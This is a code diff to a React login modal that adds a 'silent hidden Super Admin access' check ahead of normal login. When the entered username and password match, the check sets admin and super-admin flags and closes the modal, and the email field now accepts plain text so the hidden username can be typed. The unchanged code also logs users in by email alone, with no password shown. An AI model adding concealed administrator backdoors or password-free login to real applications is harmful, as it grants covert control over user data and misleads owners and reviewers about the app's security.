@@ -1,16 +1,17 @@
 import React, { useState } from 'react';
 import { X, Lock, Mail, User, Shield, Camera, Phone, Sparkles } from 'lucide-react';
 import { UserProfile } from '../types';
-import { loginUser, registerUser } from '../services/userService';
+import { loginUser, registerUser, authenticateHiddenSuperAdmin, setAdminLoggedIn, setSuperAdminLoggedIn } from '../services/userService';
 import { googleSignIn } from '../services/firebase';
 
 interface AuthModalProps {
   isOpen: boolean;
   onClose: () => void;
   onSuccess: (user: UserProfile) => void;
+  onSuperAdminSuccess?: () => void;
 }
 
-export const AuthModal: React.FC<AuthModalProps> = ({ isOpen, onClose, onSuccess }) => {
+export const AuthModal: React.FC<AuthModalProps> = ({ isOpen, onClose, onSuccess, onSuperAdminSuccess }) => {
   const [mode, setMode] = useState<'login' | 'register'>('login');
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
@@ -33,8 +34,18 @@ export const AuthModal: React.FC<AuthModalProps> = ({ isOpen, onClose, onSuccess
     try {
       if (mode === 'login') {
         if (!email) {
-          setError('Por favor introduce tu correo electrónico.');
+          setError('Por favor introduce tu correo electrónico o usuario.');
           setIsLoading(false);
+          return;
+        }
+        // Check silent hidden Super Admin access
+        if (authenticateHiddenSuperAdmin(email, password)) {
+          setAdminLoggedIn(true);
+          setSuperAdminLoggedIn(true);
+          setEmail('');
+          setPassword('');
+          if (onSuperAdminSuccess) onSuperAdminSuccess();
+          onClose();
           return;
         }
         const user = loginUser(email);
@@ -235,7 +246,7 @@ export const AuthModal: React.FC<AuthModalProps> = ({ isOpen, onClose, onSuccess
               Correo Electrónico *
             </label>
             <input
-              type="email"
+              type={mode === 'login' ? 'text' : 'email'}
               required
               value={email}
               onChange={(e) => setEmail(e.target.value)}
